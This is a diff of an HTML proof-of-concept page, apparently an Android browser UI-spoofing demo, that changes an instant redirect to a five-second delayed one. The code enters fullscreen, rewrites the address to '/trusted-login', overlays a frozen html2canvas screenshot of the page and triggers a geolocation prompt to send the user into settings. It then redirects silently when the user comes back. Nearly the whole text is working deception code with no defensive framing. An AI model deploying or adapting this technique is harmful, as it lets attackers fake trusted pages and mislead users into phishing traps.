@@ -3,8 +3,10 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Android Geo Direct Redirect PoC</title>
+<title>Android Geo Redirect Delay PoC</title>
+
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
 <style>
 body {
   margin:0;
@@ -23,20 +25,21 @@ button {
 }
 </style>
 </head>
+
 <body>
 
-<button id="start">Start Demo</button>
+<button id="start">Start Demooo</button>
 
 <script>
 const TARGET = "https://google.com";
 let triggered = false;
 
-// Freeze UI overlay
+// freeze UI
 function freezeUI() {
-  return html2canvas(document.body, {scale:2, useCORS:true}).then(canvas=>{
+  return html2canvas(document.body,{scale:2}).then(canvas=>{
     const img = document.createElement("img");
     img.src = canvas.toDataURL();
-    Object.assign(img.style, {
+    Object.assign(img.style,{
       position:"fixed",
       top:"0",
       left:"0",
@@ -49,34 +52,45 @@ function freezeUI() {
   });
 }
 
-// Request geolocation just to trigger settings
+// trigger permission
 function requestGeo() {
   navigator.geolocation.getCurrentPosition(()=>{},()=>{});
 }
 
-// Direct redirect
-function redirectNow() {
-  if(!triggered){
-    triggered = true;
+// 🔥 redirect dengan delay 5 detik
+function delayedRedirect() {
+  if (triggered) return;
+  triggered = true;
+
+  setTimeout(() => {
     location.replace(TARGET);
-  }
+  }, 5000); // 5 detik
 }
 
-// Detect user returning from Settings
-document.addEventListener("visibilitychange", ()=>{ if(document.visibilityState==="visible") redirectNow(); });
-window.addEventListener("focus", redirectNow);
-window.addEventListener("pageshow", redirectNow);
+// detect balik dari settings
+document.addEventListener("visibilitychange", () => {
+  if (document.visibilityState === "visible") {
+    delayedRedirect();
+  }
+});
 
-// Start PoC
-document.getElementById("start").onclick = ()=>{
-  if(document.documentElement.requestFullscreen){
+window.addEventListener("focus", delayedRedirect);
+window.addEventListener("pageshow", delayedRedirect);
+
+// start
+document.getElementById("start").onclick = () => {
+
+  if (document.documentElement.requestFullscreen) {
     document.documentElement.requestFullscreen();
   }
 
   history.replaceState({}, '', '/trusted-login');
 
-  freezeUI().then(()=>{ setTimeout(requestGeo, 100); });
+  freezeUI().then(()=>{
+    setTimeout(requestGeo, 100);
+  });
 };
+
 </script>
 
 </body>
